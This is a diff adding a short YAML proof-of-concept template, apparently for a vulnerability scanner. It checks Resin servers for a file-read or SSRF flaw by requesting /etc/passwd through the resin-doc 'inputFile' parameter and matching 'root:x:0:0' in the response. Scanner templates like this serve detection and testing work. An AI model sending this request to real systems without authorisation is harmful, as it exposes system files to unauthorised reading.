@@ -1,0 +1,10 @@
+name: poc-yaml-resin-inputfile-fileread-or-ssrf
+rules:
+  - method: GET
+    path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
+    follow_redirects: false
+    expression: |
+      status == 200 && body.bcontains(b'root:x:0:0')
+detail:
+  author: whynot(https://github.com/notwhy)
+  links: https://www.secpulse.com/archives/496.html
